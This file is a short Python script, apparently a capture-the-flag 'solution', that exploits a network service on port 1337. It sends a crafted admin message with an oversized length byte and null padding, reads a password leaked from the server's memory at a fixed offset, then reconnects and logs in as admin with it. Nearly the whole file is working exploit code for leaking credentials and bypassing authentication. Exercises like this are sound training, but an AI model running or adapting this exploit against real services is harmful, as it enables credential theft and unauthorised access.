#!/usr/bin/python3

import socket
import sys

if len(sys.argv) < 2:
    print("Usage: ./solution.py <ip-address>")
    sys.exit(0)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((sys.argv[1], 1337))

client.send(b'\xffadmin' + b'\x00' * 250)
client.send(b'\x06passwd')

leakedPassword = client.recv(1024)[52:84]
client.close()

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((sys.argv[1], 1337))
client.send(b'\x05admin')
client.send(b'\x20' + leakedPassword)

print(client.recv(100).decode('utf-8'))
